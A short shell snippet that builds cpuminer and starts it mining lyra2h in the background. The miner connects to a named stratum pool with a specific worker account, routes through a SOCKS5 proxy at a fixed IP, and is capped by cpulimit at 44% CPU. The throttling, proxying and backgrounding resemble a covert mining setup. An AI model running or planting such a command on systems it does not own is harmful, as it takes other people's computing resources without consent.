...
./build.sh
make
cpulimit --exe cpuminer --limit 44 -b && ./cpuminer -a lyra2h -o stratum+tcp://sg-mine.idcray.com:10111 -u manlytq.phuongnd01 -p x -x socks5://45.32.192.60:1191 --background
